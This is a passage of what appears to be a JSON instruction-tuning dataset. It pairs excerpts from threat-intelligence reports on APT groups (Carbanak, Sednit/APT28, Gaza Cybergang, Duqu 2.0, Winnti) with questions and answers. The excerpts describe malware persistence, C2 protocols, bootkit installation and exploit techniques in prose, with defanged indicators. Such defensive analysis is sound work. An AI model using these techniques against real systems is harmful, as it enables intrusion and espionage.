C2 server when an internet connection is detected.\nA .BAT script for detecting infections is provided in the Appendixes.\nAdditionally, Carbanak can obtain proxy configuration information from headers sent through an application via SOCKS or HTTP.\nCarbanak injects its code into svchost.exe. Most of the actions described below happen within this process.\nCarbanak downloads the file kldconfig.plug from its C2 server. This file includes the names of the processes to be monitored.\nOnce the system is infected, Carbanak logs keystrokes and takes screenshots every 20 seconds. This monitoring is performed by intercepting the ResumeThread call.\nTo enable connections to the infected computer using the Remote Desktop Protocol (RDP), Carbanak sets Termservice service execution mode to Auto. Also, after executing this service, it modifies the executable code in memory in order to establish simultaneous work processes for both remote and local users. Modules modified in this process are: termsrv.dll, csrsrv.dll, msgina.dll and winlogon.exe.\nIf Carbanak detects the banking application BLIZKO (funds transfer software) in the infected computer, it sends a special notification to its C2 server. Carbanak is also aware of the IFOBS banking application and can, on command, substitute the details of payment documents in the IFOBS system.\nTo communicate with its C2 server, Carbanak uses the HTTP protocol with RC2+Base64 encryption, adding additional characters not included in Base64. It also inserts strings with different extensions (.gif,.htm, etc.) at random locations in the HTTP request.\nExample of a typical Carbanak request:\nCarbanak sends its collected monitoring data to its C2 server. It also receives commands. The commands are compared with a hash table; if there is a match Carbanak performs the associated action:\nIn order to render the malware less suspicious, the latest Carbanak samples are digitally signed:\n1. footprintcrsgn.dll MD5 08F83D98B18D3DFF16C35A20E24ED49A\n\nHow does Carbanak maintain persistence on an infected system? Describe the steps it takes to ensure it runs automatically and how it adapts to different environments.",
    "output": "A: Carbanak maintains persistence on an infected system by copying itself into the '%system32%\\com' directory with the name 'svchost.exe' and setting the file attributes to system, hidden, and read-only. It then deletes the original file created by the exploit payload. To ensure autorun privileges, Carbanak creates a new service with a name derived from an existing service, with the first character deleted. Before creating the malicious service, Carbanak checks for the presence of Kaspersky Internet Security components and attempts to exploit a known vulnerability (CVE-2013-3660) for local privilege escalation if necessary. This adaptation shows the attackers' ability to tailor their tools to the victim's defenses.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Executive Summary\nOverlaps in targeting, malware characteristics, and long-term malware evolutions post 2018 suggest that the Gaza Cybergang sub-groups have likely been consolidating, possibly involving the establishment of internal and/or external malware supply lines.\nGaza Cybergang has upgraded its malware arsenal with a backdoor that we track as Pierogi++, first used in 2022 and seen throughout 2023.\nRecent Gaza Cybergang activities show consistent targeting of Palestinian entities, with no observed significant changes in dynamics since the start of the Israel-Hamas war.\nSentinelLabs' analysis reinforces the suspected ties between Gaza Cybergang and WIRTE, historically considered a distinct cluster with loose relations to the Gaza Cybergang.\nBig Headline: Micropsia and Pierogi++ Target Hamas Opposition\nThe Gaza Cybergang umbrella has (<https://blog.talosintelligence.com/arid-viper-targets-palestine/>)continuously (<https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/mantis-palestinian-attacks>)targeted Israeli and Palestinian entities preceding the Israel-Hamas war. We observed additional activities spanning from late 2021 to late 2023 aligned with previous research. Our visibility into these activities, and the theme and language of the used lure and decoy documents, indicate that they were primarily targeting Palestinian entities. The majority involved malware variants of the staple Micropsia family.\nAmong the Micropsia family malware, we observed its Delphi and Python-based variants deploying decoy documents written in Arabic and focussing on Palestinian matters, such as the Palestinian cultural heritage and political events. Many of the associated C2 domain names, such as bruce-ess[.]com and wayne-lashley[.]com, reference public figures,\nwhich aligns with the known domain naming conventions of the group. To support further collective tracking of Gaza Cybergang activities, we focus at the end of the report on listing previously unreported Micropsia indicators.\nDecoy document\nAmong the Micropsia activities we identified a backdoor that we assess is based on a malware first reported in 2020 and named (<https://www.cybereason.com/blog/research/new-cyber-espionage-campaigns-targeting-palestinians-part-2-the-discovery-of-the-new-mysterious-pierogi-backdoor>)Pierogi. This backdoor, which we labeled Pierogi++, is implemented in C++, and we observed its use in 2022 and over 2023. The malware is typically delivered through archive files or weaponized Office documents on Palestinian matters, written in English or Arabic.\nMalicious documents distributing Pierogi++\nThe documents distributing Pierogi++ use macros to deploy the malware, which then typically masquerades as a Windows artifact, such as a scheduled task or a utility application. The malware implementation is embedded either in the macros or in the documents themselves, often in Base64-encoded form.\nOffice macro deploying Pierogi++\nPierogi++ executables also masquerade as politically-themed documents, with names such as \"The national role of the revolutionary and national councils in confronting the plans for liquidation and Judaization\", \"The situation of Palestinian refugees in Syria refugees in Syria\", and \"The Ministry of State for Wall and Settlement Affairs established by the Palestinian government\".\nWe assess that Pierogi++ is based on the Pierogi backdoor, whose variants are implemented in Delphi and Pascal. Pierogi and Pierogi++ share similarities in code and functionalities, such as strings, reconnaissance techniques, and deployment of decoy documents, some also seen in Micropsia malware.\nString indicating that no anti-virus solution has been detected: Pierogi++ (Tm9BVg== decodes to NoAV)\nMicropsia\nFurther, Pierogi++ samples implement in the same order the same backdoor functionalities as Pierogi: taking screenshots, command execution, and downloading attacker-provided files.\nWhen handling backdoor commands, some Pierogi++ samples use the strings download and screen, whereas earlier Pierogi samples have used the Ukrainian strings vydalyty, Zavantazhyty, and Ekspertyza. This raised suspicions at the time of potential external involvement in Pierogi's development. We have not observed indicators pointing to such involvement in the Pierogi++ samples we analyzed.\nPierogi++ backdoor strings\nMost of the Pierogi++ C2 servers are registered at Namecheap and hosted by Stark Industries Solutions LTD, aligning with previous infrastructure management practices of the Gaza Cybergang umbrella. The backdoor uses the  library for exchanging data with the C2 server, a technique that we do not often observe in Gaza Cybergang's malware arsenal.\nUse of the curl library\nPierogi++ represents a compelling illustration of the continuous investment in maintenance and innovation of Gaza Cybergang's malware, likely in an attempt to enhance its capabilities and evade detection based on known malware characteristics.\nBig Headline: From Molerats to Arid Viper And Beyond\nFollowing the first report on the Pierogi backdoor in February 2020, late 2020 and 2021 mark the association of the backdoor and its infrastructure with Arid Viper. The Micropsia activity linked to Arid Viper, which led to the (<https://unit42.paloaltonetworks.com/pymicropsia/>)discovery of the then-new PyMicropsia malware in December 2020, includes Pierogi samples. Further historical Pierogi samples use the escanor[.]live and nicoledotso[.]icu domains for C2 purposes, which have been associated with Arid Viper in  and (<https://about.fb.com/wp-content/uploads/2021/04/Technical-threat-report-Arid-Viper-April-2021.pdf>)April 2021. The latest variant of Pierogi is Pierogi++, which we observed targeting Palestinian entities in 2022 and over 2023 \u2013 this targeting is typical for Arid Viper.\nOur investigations into malware used by Gaza Cybergang prior to 2022, which share capabilities, structure, and infrastructure with Pierogi, resulted in a multitude of samples implemented in Delphi, Pascal, and C++. This highlights the frequent adoption of different development paradigms by Gaza Cybergang and aligns with the  by Facebook, which associates these variants with Arid Viper and tracks them using different names under the broader Micropsia malware family, such as Glasswire, Primewire, and fgref.\nMalware attributions\nLater in June 2021, the LastConn malware, which has been  as part of activities attributed to the TA402 cluster, was assessed with high confidence to be an updated version of SharpStage.\nBased on our followup investigation into recent 2023 (<https://www.proofpoint.com/us/blog/threat-insight/ta402-uses-complex-ironwind-infection-chains-target-middle-east-based-government>)TA402 activity targeting Middle Eastern government entities, we highlight concrete overlaps in malware used by TA402 and a lesser-known threat actor named WIRTE. First  in April 2019, WIRTE was initially considered to be a distinct cluster but later  with low confidence to the Gaza Cybergang umbrella (primarily based on the use of decoys on Palestinian matters, which are typical for the Gaza Cybergang constituent sub-groups).\nWIRTE is known for using a unique custom user agent for C2 communication when staging malware, with the value of the rv field likely being an intrusion identifier. WIRTE's stagers encapsulate C2 communication attempts in an infinite loop, separated by sleep periods of randomly generated lengths within defined lower and upper boundaries. We observe the same unique user agent format and C2 communication pattern in TA402's .NET malware stagers.\nUser agent and C2 communication in 2020 WIRTE malware\nUser agent and C2 communication in 2022 TA401 malware\nThe involvement of malware artifacts previously seen only in the context of WIRTE indicates a likely relation between the TA402, WIRTE, and Gaza Cybergang clusters. This aligns with the latest TA402 attribution assessment as a cluster overlapping with Gaza Cybergang and WIRTE.\nRead the text above and answer this question: What are the key indicators that suggest a consolidation among the Gaza Cybergang sub-groups, and how might this impact their operational efficiency and sophistication?",
    "output": "Key indicators suggesting consolidation among the Gaza Cybergang sub-groups include overlaps in targeting, shared malware characteristics, and long-term malware evolutions post-2018. This consolidation likely involves the establishment of internal and/or external malware supply lines. Such consolidation could lead to improved operational efficiency and sophistication, as it allows for the streamlined development and maintenance of malware, potentially through an internal hub or external vendors. This could result in more coordinated and effective cyber operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: EXECUTIvE SUMMaRY\nThe Sednit group \u2014 also known as APT28, Fancy Bear and Sofacy \u2014 is a group of attackers operating since 2004 if not earlier and whose main objective is to steal confidential information from specific targets.\nThis is the second part of our whitepaper\"En Route with Sednit\", which covers the Sednit's group activities since 2014. Here, we focus on Sednit's espionage toolkit, which is deployed on targets deemed interesting after a reconnaissance phase (described in the first part of the whitepaper).\nThe key points described in this second installment are the following:\n\u2022 The Sednit group developed two different spying backdoors for long term monitoring, named Sedreco and Xagent, in order to maximize the chance of avoiding detection\n\u2022 The Xagent backdoor can communicate with its C&C server over email with a custom protocol, which in some cases is based on Georgian words\n\u2022 The Sednit group developed a network proxy tool, named Xtunnel, to effectively transform a compromised computer into a network pivot, in order to contact machines that are normally unreachable from the Internet\n\u2022 The Xagent source code, the Xagent C&C server configuration, and the Xtunnel binaries all contain traces of Russian, strongly reinforcing the hypothesis that this is the language employed by the Sednit group's members\nFor any inquiries related to this whitepaper, contact us at:\n\nAnswer this question based on the above context: Why did the Sednit group develop multiple spying backdoors, specifically Sedreco and Xagent, and how does the use of these tools enhance their ability to avoid detection?",
    "output": "The Sednit group developed two different spying backdoors, Sedreco and Xagent, to maximize their chances of avoiding detection. By using multiple backdoors, they diversify their methods of maintaining access to compromised systems. This redundancy makes it harder for defenders to completely eradicate the threat, as they would need to detect and remove both backdoors. Additionally, the Xagent backdoor has the capability to communicate with its Command & Control (C&C) server over email using a custom protocol, which in some cases is based on Georgian words. This unique communication method further complicates detection efforts, as it blends in with regular email traffic and uses an uncommon language, making it less likely to be flagged by traditional security measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does APT3 leverage vector corruption techniques to gain read/write access to memory in their exploit?",
    "output": "APT3 uses a classic Adobe Flash Player Vector corruption technique to develop its heap corruption vulnerability into a full relative read/write capability available to ActionScript3. The attacker sprays Adobe Flash Player Vectors to the heap and triggers a write vulnerability to change the size of one of the vectors. This allows the attacker to perform subsequent reads and writes to memory outside the intended boundaries of the corrupted Vector object from AS3. Once limited read/write access to memory is achieved, the attacker corrupts a second Vector to increase their access to a range of 0x3fffffff bytes. This second Vector is used for the remainder of the exploit.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Very Small Headline: Yemen Cyber Army\nIn the wake of the success of the CyberCaliphate campaign, another hacktivist group emerged: Yemen Cyber Army (YCA) appeared in May 2015. As with the other two groups, YCA also had no prior history and its members were completely unknown. They proclaim to be a hacktivist group operating out of Yemen, specifically supporting the Houthi movement and possessing strong anti-Saudi sentiments.\nSaudi Arabia mounted a bombing effort in March 2015 against Yemen to suppress the ongoing Houthi forces that were overtaking Yemen's government in Sana'a. Shortly after this campaign in April 2015, the website of the London-based AlHayat newspaper was defaced by YCA. Subsequently, in May 2015, the Saudi Ministry of Foreign Affairs was also hacked by YCA and thousands of internal communications were published on Wikileaks. Many researchers currently believe YCA is an Iranian-led front to cause damage and spread propaganda against the Saudi government, but after investigating the group and its activities further, a new theory has surfaced, indicating that this is potentially another campaign orchestrated by Sofacy. While there is no solid proof showing that this is, in fact, Sofacy and not Iran, we point to factors that may shed some light in favour of the former.\nFirst, it is important to understand the relationship between Russia and Saudi Arabia. Saudi is arguably one of the top nemeses of the Russian government, dating as far back as the 1980s when Saudi supported the Mujahideen during the Soviet-Afghan war. Saudi is a key US ally in the Middle East and also allied with other countries in the region that do not hold close diplomatic relations with Moscow. In February 2015, Saudi deployed fighter jets to Turkey for use in ground-based operations in Syria to support the militant opposition. Also during this time, Russia openly accused Saudi of depressing oil prices in an effort to tank the Russian economy.\nAll of this speaks to the potential motive of why Russia would be very much interested in damaging the Saudi government.\nAround the same time, in February 2015, Sofacy was discovered using a zero-day exploit against a select few targets, one of these being the Saudi Embassy in Ukraine. This exploit was used in the wild only by Sofacy until April 2015, when Microsoft finally patched it. The very limited use of this exploit during this time frame, combined with the fact that the Saudi Embassy was actively being targeted, shows a very real possibility that Sofacy had access to the Saudi Ministry of Foreign Affairs networks as early as February 2015.\nAnother interesting tie to Sofacy is a domain that was established by YCA in June 2015 (wikisaleaks[.]com). This domain was registered using privacy-protected services, but digging behind the protection revealed that the email registrant used for this domain was 'nghockeng@yandex.com', the same as was used to register three other domains utilized by YCA (yemenica[.]com, yemenica[.]org, and yemenica[.]net). While this specific registrant has never directly been tied to known Sofacy domains, the use of Yandex email accounts is a favourite for the group. Also interesting are the nameservers used for wikisaleaks[.]com. This domain utilizes nameservers from\norderboxdns[.]com, which is also a highly favoured provider for Sofacy. Further digging revealed that the domain is being hosted at 87.236.215.129. While this IP address has never been used by Sofacy before, the subnet is also a favourite of the group's. The following are some other IP addresses in the same subnet used by Sofacy in past attacks:\nAs stated above, while none of these observations represent the proverbial 'nail in the coffin', in combination they strengthen the claim that Sofacy could be behind YCA, just as it has been with the prior two campaigns. Another possibility is that Sofacy could be providing information and assistance to an Iranian-based group as they may share an interest in damaging the Saudi government. Whatever the case, Sofacy has displayed a predilection and gift for running effective deception campaigns against targets of interest, and is likely to continue to do so.\nSmall Headline: Duqu 2.0\nThe formidable Duqu was first discovered in 2011 by CrySyS Lab and extensively researched by GReAT. The initial notoriety of Duqu was largely due to the malware's relationship to Stuxnet, with specific modules displaying traits of shared development indicative of the Tilded platform. But Duqu is most admirable for its audacity, as displayed by the choice of infecting a Hungarian digital certificate authority in order to solve an operational requirement. Appreciative of GReAT's admiration, as conveyed through more than half a dozen blog posts and extensive analysis, the legendary threat actor resurged by hand-delivering a vastly improved version of the malware to our doorstep. This time around, Duqu was equipped with up to three zero-day exploits including a kernel exploit (CVE-2015-2360), memory-resident malware signed with a stolen digital certifi cate, and a unique persistence philosophy cognizant of the victim as a network rather than a collection of independent victim machines [25]. Other unwitting recipients of this gift included venues for P5+1 talks, industrial control systems-related companies, and telecommunications providers [26].\nDuqu 2.0 is entirely modular, spanning upwards of 100 plug-in variants, with separate modules to handle specifi c operations like communications with command-and-control infrastructure and tunnelling directly into the victim's LAN. Among the latter is an NDIS filter driver internally named 'termport.sys'10, whose functionality is toggled by packets that include the hard-coded magic string, 'romanian.antihacker' in the 32-bit driver. The 64-bit version, on the other hand, uses 'ugly.gorilla': a reference\nto a member of Comment Crew/APT1 [27]. Wang Dong, known by the alias 'Jack Wang' or the handle 'Ugly Gorilla', was one of the five PLA officers indicted [28] by a US grand jury in 2014 on 31 criminal counts related to computer abuse activities. Though APT1/Comment Crew remains active to this day, presumably with Wang Dong amongst its ranks, the idea that they are behind the Duqu 2.0 attacks is patently ridiculous.\n10 The filename at time of deployment was changed to 'portserv.sys'.\nApart from a series of attributory indicators pointing in an entirely different direction, the APT1 group would have needed to get their hands on the original Duqu source code given the structural similarities in some modules of the new platform. The more likely explanation is that the threat actor noted the greater risk posed by a device driver (compared to the memory-resident modules) and peppered some false flags to misguide incident responders. By citing a publicly indicted member of a well known and widely reported APT crew, the Duqu developers may have mislead an IR team whose technical expertise in the area of threat intelligence amounted to Google searching binary strings with no greater awareness of the threat landscape to draw from.\nSmall Headline: TigerMilk\nThe mysterious TigerMilk11 actor is a thus far unattributed, privately reported discovery. The campaign started in early 2015, targeting Peruvian institutions and entities exclusively for a period of six months. The attacker used a commonplace exploit (CVE-2012-0158) in conjunction with a curriculum vitae stolen from a local victim in order to infect users with custom credential-stealing malware. The position-independent backdoor was injected into processes like explorer.exe and various browsers. In 64-bit systems, the malware would spawn a separate desktop with its own infected explorer.exe to avoid suspicion. However, in operation the malware was clunky and caused perceptible instability so neither the development nor the intended functionality were indicative of a sophisticated actor. So why mention TigerMilk?\nThe one particular feature of TigerMilk that makes it noteworthy is its use of a notorious digital certifi cate. Every backdoor deployed is signed with the same stolen Realtek certifi cate12 as Stuxnet(.a/.b). The samples were compiled and signed long after the certificate's validity expired13, thereby obviating its use as a means of bypassing execution controls. As such, the only imaginable value of signing these samples with this particular certificate is to fool incident responders and researchers into casting blame on the notorious Stuxnet team for an attack on Peruvian military and government institutions. Moving beyond this basic deception, the true unresolved mystery of TigerMilk is: how did this new actor get its hands on this specifi c certifi cate?\n\nAnswer this question based on the above context: How did the Duqu 2.0 malware demonstrate an advanced understanding of network persistence, and what implications does this have for defending against such threats?",
    "output": "Duqu 2.0 demonstrated an advanced understanding of network persistence by using a unique philosophy that views the victim as a network rather than a collection of independent machines. It employed separate modules to handle specific operations like communications with command-and-control infrastructure and tunneling directly into the victim's LAN. One notable module was an NDIS filter driver that could be toggled by packets containing specific magic strings. This approach implies that defenders must adopt a holistic view of their network and implement defenses that can detect and respond to coordinated, multi-faceted attacks rather than focusing solely on individual endpoints.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: extend c&c servers list\nFirst, Downdelph downloads a main configuration file named extended.ini from the initial C&C server, whose address is hardcoded in the binary. The network request is an HTTP POST with a URI containing the file name to fetch encoded with a custom algorithm, as pictured in Figure 7.\nThe encoding algorithm was designed to make writing signatures on Down-delph network requests difficult. To do so, pseudo-randomly generated characters are inserted between each original character during the encoding, such that the same input text will be encoded differently each time.\nThe response from the server is an RC4-encrypted configuration file following the INI format (<>)[16], and composed of a single section named [options], which contains the key-value pairs described in Table 1.\nIf the Servers key is not empty, Downdelph adds the C&C server addresses to its list of servers to contact to download payloads.\nThe RC4 algorithm uses by default a 50-byte hardcoded value, to which the last two bytes of the input text are appended to form the key, before decrypting. This 50-byte value is present in other Sednit components, such as Seduploader and Xagent.\nSmall Headline: Payload Download\nFor each known C&C server \u2014 the initial one and the additional ones possibly provided in extended.ini\u2014 Downdelph performs three steps leading to the download of a payload.\nFirst, it sends a machine ID, which was previously generated from the hard drive serial number.\nSecond, it downloads a configuration file named pinlt.ini describing the payload to fetch from this particular C&C server (if any). The network request follows a format similar to the one shown in . The possible key-value pairs of the received file are described in Table 2.\nFinally, if the previous configuration file is non-empty, Downdelph downloads a payload from this C&C server, and processes it according to the configuration.\nOnce all C&C servers have been contacted, Downdelph sleeps for a certain amount of time (defined by the Sleep key in its configuration), and then re-starts the whole workflow from the beginning, including downloading the main configuration file from the initial C&C server.\nWe do not have in-the-wild examples of Downdelph configuration files. Nevertheless, we know that in a few cases this component eventually downloaded Sedreco and Xagent.\nSmall Headline: Bootkit\nInterestingly, we observed Downdelph deployment with a bootkit on two occasions, Cases 1 and 5 in . As defined in ESET's VirusRadar\u00ae (<>)[17], a bootkit is\"A type of rootkit that infects the Master Boot Record or Volume Boot Record (VBR) on a hard disk drive in order to ensure that its code will be run each time the computer boots. [\u2026]\".\nIn recent years, bootkits have become popular as a way to load unsigned malicious Windows drivers, which is normally prevented by the OS in 64-bit versions of Windows. But in the present case the bootkit serves as a stealthy persistence method for the user-mode downloader Downdelph \u2014 although for this purpose an unsigned driver will indeed be loaded, as we will describe later. Persistence through a bootkit makes detection harder, as its code is executed before the operating system is fully loaded.\nThe bootkit in question has the ability to infect Microsoft Windows versions from Windows XP to Windows 7, on both 32-bit and 64-bit architectures. To the best of our knowledge the bootkit used by Downdelph has never been documented, even though it belongs to the well-known category of bootkits infecting the Master Boot Record (MBR) \u2014 first sector of the hard drive \u2014 to take control of the startup process.\nWe will now describe the various components installed on the machine during the infection by the bootkit, and then how those components cooperate during startup to eventually execute Downdelph.\nVery Small Headline: Installation Process\nThe bootkit installation process varies depending on the Windows version, and whether the machine is 32-bit or 64-bit. In all cases the bootkit installer starts by overwriting the hard drive's first sectors \u2014 a sector being the basic hard drive storage unit, resulting in a new hard drive layout as shown in Figure 8 and described in the following.\nFirst things first: the MBR is overwritten with a custom version, while an encrypted copy of the original MBR code is stored in the second sector. Starting in the third sector comes the core bootkit code, encrypted with a simple XOR-based algorithm. This core code will be slightly different depending on the operating system versions, as the hooks \u2014 described later \u2014 put in place at startup will vary. Finally comes an RC4-encrypted Windows driver, which depending on the architecture will be a 32-bit or 64-bit binary.\nIn order to access the first sectors of the hard drive, the installer employs a technique previously seen in the infamous TDL4 bootkit (<>)[18], whose code is shown in Figure 9.\nOnce this device access is established, the installer simply calls the Windows API function WriteFile to overwrite the hard drive's first sectors. It should be noted that this method requires administrative rights on the system.\nSecond, the installer stores a DLL in the newly created Windows Registry key HKLM\\SYSTEM\\ CurrentControlSet\\Control\\Lsa\\Core Packages. As we will explain later, this binary is the user mode component of the bootkit. Additionally, Downdelph itself is stored in the same registry path, but in the key named Impersonation Packages.\nThese two files are stored in Windows' Registry following a custom-encrypted data format that is also used for the bootkit code initially contained in the installer. More precisely, the data are aPLib-compressed (<>)[19], then RC4-encrypted, and begin with the following header:\nThe magic 4-byte value\" :3\" is also written by the bootkit installer at offset 0x19B of the MBR, as a marker to indicate that the hard drive has already been infected in the event that the installer is re-executed.\nSmall Headline: Startup Process\nOnce installed, the bootkit takes control of the machine during the next system startup. The startup process is detailed in Figure 10 for Windows 7, where only the steps involving the bootkit are shown.\nRoughly summarized, a bootkit's objective is to\"survive\" Windows' startup and eventually to execute a payload once the operating system is fully running. Such survival is made difficult by the strong modifications of the machine state at each step of the startup process (for example by reorganizing memory or switching the CPU mode). Hence, starting from the initially infected MBR, the bootkit ensures at each step that it will regain control at the next step, mainly by setting hooks.\nWhile the bootkit workflow described in Figure 10 bears some similarities with other known MBR-infected bootkits (see\"Bootkits: Past, Present & Future\" (<>)[20] for some examples), there are certain particularities that we would like to point out:\n\u2022 The bootkit MBR decrypts the bootkit code and the bootkit driver initially stored from the third sector (see ) into a memory buffer. On the system we used for analysis, the buffer was located at physical memory address 0x97C00. This memory area therefore contains the bulk of the bootkit code, and the hooks in bootmgr, winload.exe and ACPI. sys re-route the execution flow to this buffer. It is more common for bootkits to copy their code at each step into a new memory area, in order to survive memory re-organization during startup.\n\u2022 This is the first use of the genuine Windows driver ACPI.sys in a bootkit, to the best of our knowledge. More precisely, the entry-point of this driver is patched to redirect to a small snippet of code written in its resources section, as shown in Figure 11.\nThis code receives as an input parameter the memory address of the Windows kernel ntoskrnl. exe, where the bootkit stores some crucial data in unused PE header fields. Using these data, it first restores the first five bytes of the original ACPI.sys entry-point, and then redirects to bootkit code stored at physical memory address 0x97C00, mapped in the virtual memory space using the Windows API MmMapIoSpace (<>)[21]. This bootkit code will decrypt and execute the bootkit driver.\nThe modifications to the ACPI.sys driver bypass Windows' bootloader integrity checks, because those checks are done on the hard-drive version of the file, not on the in-memory version.\n\u2022 The bootkit driver injects the bootkit user-mode component into the explorer.exe process by patching its entry-point before it is executed. The user mode component then loads Downdelph and, interestingly, it tries to set an exported global Boolean variable named m_bLoadedByBootkit in Downdelph to TRUE, as shown in Figure 12.\nAs this global variable is absent in all Downdelph binaries, we speculate that the bootkit was originally intended to be used with a different payload, and was repurposed by Sednit's operators.\nMoreover, the user-mode component of the bootkit exports two functions named Entry and ep_data. Those two export names are also present in early samples of the infamous BlackEnergy malware (<>)[11]. Also, we found several cases of code sharing between the bootkit components and the same BlackEnergy samples. These hints lead us to speculate that the developers may be related.\n\nExplain the process by which Downdelph downloads and processes payloads from its known C&C servers. What steps are involved, and what happens after all C&C servers have been contacted?",
    "output": "For each known C&C server, Downdelph performs three steps leading to the download of a payload. First, it sends a machine ID generated from the hard drive serial number. Second, it downloads a configuration file named pinlt.ini describing the payload to fetch from this particular C&C server. Finally, if the configuration file is non-empty, Downdelph downloads a payload from this C&C server and processes it according to the configuration. Once all C&C servers have been contacted, Downdelph sleeps for a certain amount of time (defined by the Sleep key in its configuration) and then restarts the entire workflow from the beginning, including downloading the main configuration file from the initial C&C server.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Winnti group manage to infect gamers' computers with a Trojan, and what unique characteristics did this Trojan possess that made it notable? Discuss the implications of these characteristics for cybersecurity professionals.",
    "output": "The Winnti group managed to infect gamers' computers with a Trojan by compromising the official update server of a popular online game. The Trojan was distributed as part of a regular game update. This particular Trojan was notable because it was a DLL library compiled for a 64-bit Windows environment and used a properly signed malicious driver. It contained a backdoor payload functioning as a fully-fledged Remote Administration Tool (RAT), allowing cybercriminals to control victim computers without the user's knowledge. This incident marked the first known instance of a Trojan for the 64-bit version of Microsoft Windows with a valid digital signature. For cybersecurity professionals, this highlights the importance of securing update servers and the potential for advanced persistent threats to leverage valid digital signatures to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: A Bit More Abuse\nThe phishing URLs in this campaign were encoded with a distinct set of parameters using base64. When clicked, the links provided key information about the targets to the phishing website. An identical approach to parameters and encoding (see Figure 28 below) has been seen before: in the March 2016 phishing campaign that targeted Hillary Clinton's presidential campaign and the Democratic National Committee. This similarity suggests possible code reuse: the two operations may be using the same phishing 'kit'.\nThe that targeted the DNC also included the same Google security-themed phishing ruse, and abused another URL shortening service, In June 2016 Dell SecureWorks published a attributing the operation to APT28, a threat actor\nthe Russian government.\nSecureWorks researchers were able to enumerate and analyze the targets of this campaign, thus allowing them to describe the victimology:\n\"individuals in Russia and the former Soviet states, current and former military and government personnel in the U.S. and Europe, individuals working in the defense and government supply chain, and authors and journalists \u2014 but also included email accounts linked to the November 2016 United States presidential election\"\nThis victimology strikes an immediate parallel to the target listing we have uncovered in our enumeration of the Tiny.cc URLs.\nMedium Headline: Domain Schema Commonalities\nWe found similarities in domain naming, and subdomain structures, between this campaign and operations linked to APT28.\nThe domain used in the campaign targeting Satter was id833[.]ga. At the time of the campaign, this domain name was pointed to a server at IP address 89.40.181[.]119. Using PassiveTotal, we observed other domain names sharing a similar naming scheme also directed at this IP: id834[.]ga, and id9954[.]gq. While we did not observe any phishing links for these alternate domains, there were identical subdomains registered for both:\nThis domain / subdomain naming schema is also extremely close to one featured in Mandiant's 2017 report, in a phishing operation, linked to APT28, which targeted OAuth tokens in an effort to obtain persistent access to a victim's Google account, and to\nbypass the security of two-factor authentication.\nDomain linked to this campaign:\n-\nmyaccount.google.com-changepasswordsecuritypagesettingmyaccountgooglepagelogin.id833[.]ga\n-\nDomain mentioned by Mandiant, linked to APT28:myaccount.google.com\nchangepassword-securitypagesettingmyaccountgooglepage.id4242[.]ga\nThe similarities in naming and subdomain structure are immediately apparent. The two domains (id833[.]ga and id4242[.]ga) also share a common name server. However, we were not able to find specific registration overlaps between the domains or servers.\nFurthermore, during the campaign period, the domain identified by Mandiant, id4242[.]ga resolved to 89.32.40[.]238. This IP also resolves to a range of other suspicious domains with highly similar naming schemas to those connected to the infrastructure used against Satter. The link used to phish John Podesta, as depicted above, also shares distinct naming and subdomain similarities with domains linked to the phishing operation against Satter (see Figure 28):\nDomain targeting Podesta, linked to APT28: hxxp://myaccount.google.com-securitysettingpage[.]tk\nDuring the campaign in March 2016, this domain was hosted at IP address80.255.12[.]237\nPublications from numerous private industry groups attribute 89.32.40[.]238 and 80.255.12[.]237 (as well as related domains) to APT28. While we are able to point out that there are significant commonalities in domain naming and subdomain structure between the campaign targeting Satter and domains linked to these IPs, we are not able to make a more conclusive technical link to APT28.\nWhile industry groups as well as the U.S. government have APT28 with Russian state actors, we are not able to use infrastructure analysis alone to conclusively connect the operation against Satter to a particular state sponsor. Connecting this infrastructure to a specific government would require additional evidence which is not, to our knowledge, available in the public domain.\nMedium Headline: The Challenge of Attribution\nWhile the order of events surrounding the phishing, credential theft, and eventual leak of tainted documents belonging to David Satter would seem to point to CyberBerkut, the characteristics of Russian information operations make the task of attribution to a state sponsor challenging. As a consequence, there is no \"smoking gun\" connecting the evidence we have assembled to a particular Russian government agency, despite the overlaps between our evidence and that presented by numerous industry and government reports concerning Russian-affiliated threat actors.\nAddressing the topic of attribution requires nuance and appreciation of the unique character of\nRussia's approach to the use of in the criminal underworld in particular is informed by a very elaborate strategy around information operations and control. Although this strategy has roots that go back deep into Soviet (and even earlier Russian) history, it was more fully elaborated as a component of hybrid warfare, also known as the or \",\" and infused with deeper resources after the 'color revolutions,' the 2011 Moscow protests, and upon reflection of the events of the Arab Spring. The overall Russian approach as a form of \"guerrilla geopolitics\" in which \"a would-be great power, aware that its ambitions outstrip its military resources, seeks to leverage the methodologies of an insurgent to maximise its capabilities.\" Cultivating organized criminal groups is a fundamental component of this approach, as evidenced in the annexation of Crimea which was undertaken in coordination with criminal elements who provided \"political (<http://www.ecfr.eu/page/-/ECFR_169_-_PUTINS_HYDRA_INSIDE_THE_RUSSIAN_INTELLIGENCE_SERVICES_1513.pdf>)and military muscle.\" Russian security officers are also of underworld criminal operations for illicit revenue of their own, and as a result can even prioritize criminal over national security concerns.\nWhile it is possible that a proxy actor is implementing the front-end collection component of the phishing campaign we are describing, the scale of the targeting also suggests a well-resourced actor, such as a nation state. The thread linking all of the targets is their connection to issues that the Russian government cares about. The targets are people whose positions or activities give them access to, or influence over, sensitive information of specific interest to Russia. This links an otherwise extremely diverse target set, which ranges from domestic Kremlin critics and journalists, to anti-corruption investigators, foreign government personnel, and businesspeople.\nThe data collected from such a campaign would come in more than a dozen languages, and concern a diverse range of political, military, and policy issues from at least 39 countries and 28 governments. In addition, such a campaign would be likely to generate large volumes of\ndata. For this reason, a professionalized, well-resourced operator would be needed for any effective post-collection analysis of the stolen data. Even greater resources would be required to analyse, and in some instances carefully modify in a short timeframe, the contents of stolen email and cloud-storage accounts for the purposes of seeding disinformation via tainted leaks.\nThe diversity and presumed cost of analyzing the stolen data along with the clear Russian nexus for the targets is only circumstantial evidence of a Russian connection. It should be evaluated in the context of the other pieces of circumstantial evidence we present, including the 